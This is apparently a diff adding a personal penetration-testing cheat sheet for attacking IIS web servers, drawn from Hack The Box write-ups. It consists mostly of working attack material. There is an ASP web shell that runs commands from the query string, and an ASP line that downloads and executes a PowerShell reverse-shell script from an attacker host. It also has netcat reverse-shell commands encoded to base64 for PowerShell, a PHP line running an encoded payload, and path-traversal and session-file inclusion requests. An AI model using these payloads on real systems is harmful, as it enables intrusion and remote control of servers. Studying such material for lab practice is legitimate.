@@ -1,0 +1,40 @@
+Internet Information Services
+machine.config    (root)web.config    
+C:\Windows\Microsoft.NET\Framework\{version}\Config\machine.config
+(applicationHost) Web.config->buildproviders    applicationHost.config --> handler
+C:\Windows\system32\inetsrv\config\applicationHost.config
+Wsdler   #burp extension to make right request of soap
+
+https://0xdf.gitlab.io/2018/10/27/htb-bounty.html#escalation-method-1-lonely-potato
+web.config
+.asp .cer
+<%
+command = Request.QueryString("cmd")
+Set objShell = Server.CreateObject("WScript.Shell")
+Set objExec = objShell.Exec(command)
+output = objExec.StdOut.ReadAll()
+Response.Write(output)
+%>
+
+cmd=cmd /c whoami
+
+https://0xdf.gitlab.io/2018/10/27/htb-bounty.html
+<%@ Language=VBScript %>
+<%
+  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')")
+%>
+-------------------------------------------------------------path traversal
+https://github.com/irsdl/IIS-ShortName-Scanner
+dir /x    #short name
+%SystemDrive%\inetpub\wwwroot
+\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
+https://0xdf.gitlab.io/2020/03/28/htb-sniper.html
+C:\windows\temp\    #store the session
+RMI ->  run samba process
+#convert payload to base64
+echo 'cmd /c "\\10.10.14.6\share\nc64.exe -e cmd 10.10.14.6 443"' | iconv -f ascii -t utf-16le | base64 -w0
+
+echo 'cmd /c "\\10.10.14.24\share\nc64.exe -e 10.10.14.24 443"' | iconv -f ascii -t utf-16le | base64 -w0
+<?php echo `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAMQAwAC4AMQAwAC4AMQA0AC4AMgA0AFwAcwBoAGEAcgBlAAoAYwA2ADQALgBlAHgAZQAgAC0AZQAgADEAMAAuADEAMAAuADEANAAuADIANAAgADQANAAzACIACgA=` ?>
+curl -s -G 'http://10.129.229.6/blog/' --data-urlencode 'lang=\windows\temp\sess_o73fu4a7ou20vfttlpj60tu5lf'
